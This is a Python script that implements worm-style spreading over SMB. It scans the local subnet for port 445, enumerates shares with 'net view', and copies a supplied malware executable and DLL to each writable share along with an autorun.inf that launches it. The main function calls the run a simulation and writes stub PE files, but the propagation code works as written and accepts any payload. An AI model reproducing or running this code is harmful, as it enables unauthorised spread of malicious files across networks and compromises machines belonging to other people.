import os
import shutil
import socket
import time
import threading
import subprocess
import logging
from pathlib import Path

# Set up logging for propagator
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger('propagator')

class SMBPropagator:
    def __init__(self, exe_path, dll_path):
        self.exe_path = exe_path
        self.dll_path = dll_path
        self.target_shares = []
        self.scan_threads = []
        
    def discover_network_hosts(self):
        """Discover hosts in the local network"""
        import ipaddress
        import concurrent.futures
        
        # Get local IP and subnet
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        logger.info(f"Local IP: {local_ip}")
        
        # Generate IP range for local network (assuming /24)
        network = ipaddress.IPv4Network(f"{local_ip}/24", strict=False)
        hosts = []
        
        def check_host(ip):
            try:
                # Try to connect to SMB port (445)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((str(ip), 445))
                sock.close()
                if result == 0:
                    return str(ip)
            except:
                pass
            return None
        
        logger.info(f"Scanning network {network} for SMB hosts...")
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(check_host, ip) for ip in network.hosts()]
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    hosts.append(result)
                    logger.info(f"Found SMB host: {result}")
        
        return hosts
    
    def enumerate_shares(self, host):
        """Enumerate SMB shares on a host using net view"""
        try:
            cmd = f"net view \\\\{host}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            
            shares = []
            if result.returncode == 0:
                lines = result.stdout.splitlines()
                for line in lines:
                    if line.strip() and not line.startswith('Share name') and not line.startswith('-'):
                        parts = line.split()
                        if parts and not parts[0].endswith('$'):  # Skip admin shares
                            share_name = parts[0]
                            share_path = f"\\\\{host}\\{share_name}"
                            shares.append(share_path)
                            logger.info(f"Found share: {share_path}")
            
            return shares
        except Exception as e:
            logger.error(f"Error enumerating shares on {host}: {e}")
            return []
    
    def test_write_access(self, share_path):
        """Test if we have write access to a share"""
        try:
            test_file = os.path.join(share_path, "test_write_access.tmp")
            with open(test_file, 'w') as f:
                f.write("test")
            os.remove(test_file)
            return True
        except:
            return False
    
    def propagate_to_share(self, share_path):
        """Copy executable and DLL to a network share"""
        try:
            if not self.test_write_access(share_path):
                logger.warning(f"No write access to {share_path}")
                return False
            
            exe_name = os.path.basename(self.exe_path)
            dll_name = os.path.basename(self.dll_path)
            
            target_exe = os.path.join(share_path, exe_name)
            target_dll = os.path.join(share_path, dll_name)
            
            # Copy files
            shutil.copy2(self.exe_path, target_exe)
            logger.critical(f"Propagated executable to: {target_exe}")
            
            shutil.copy2(self.dll_path, target_dll)
            logger.critical(f"Propagated DLL to: {target_dll}")
            
            # Create autorun.inf for USB/removable drives
            autorun_path = os.path.join(share_path, "autorun.inf")
            with open(autorun_path, 'w') as f:
                f.write(f"[autorun]\nopen={exe_name}\nicon={exe_name}\n")
            logger.critical(f"Created autorun.inf at: {autorun_path}")
            
            return True
            
        except Exception as e:
            logger.error(f"Error propagating to {share_path}: {e}")
            return False
    
    def start_propagation(self):
        """Start the propagation process"""
        logger.info("Starting SMB propagation...")
        
        # Discover network hosts
        hosts = self.discover_network_hosts()
        
        if not hosts:
            logger.warning("No SMB hosts found on network")
            return
        
        # Enumerate shares on each host
        all_shares = []
        for host in hosts:
            shares = self.enumerate_shares(host)
            all_shares.extend(shares)
        
        logger.info(f"Found {len(all_shares)} total shares")
        
        # Attempt to propagate to each writable share
        successful_propagations = 0
        for share in all_shares:
            if self.propagate_to_share(share):
                successful_propagations += 1
                time.sleep(1)  # Small delay between propagations
        
        logger.info(f"Successfully propagated to {successful_propagations}/{len(all_shares)} shares")

def simulate_malware_propagation():
    """Simulate malware propagation behavior"""
    # Paths to the malware files (using the ones from our project)
    exe_path = r"C:\Users\JakeClark\Downloads\test_malware\malware.exe"
    dll_path = r"C:\Users\JakeClark\Downloads\test_malware\userenv.dll"
    
    # Create test malware files if they don't exist
    os.makedirs(os.path.dirname(exe_path), exist_ok=True)
    
    if not os.path.exists(exe_path):
        with open(exe_path, 'wb') as f:
            f.write(b'MZ\x90\x00' + b'\x00' * 100)  # Minimal PE header
        logger.info(f"Created test malware executable: {exe_path}")
    
    if not os.path.exists(dll_path):
        with open(dll_path, 'wb') as f:
            f.write(b'MZ\x90\x00' + b'\x00' * 100)  # Minimal PE header
        logger.info(f"Created test malware DLL: {dll_path}")
    
    # Create and start propagator
    propagator = SMBPropagator(exe_path, dll_path)
    
    # Start propagation in a separate thread
    propagation_thread = threading.Thread(target=propagator.start_propagation, daemon=True)
    propagation_thread.start()
    
    # Keep the main thread alive
    try:
        while propagation_thread.is_alive():
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Propagation stopped by user")

if __name__ == "__main__":
    simulate_malware_propagation()
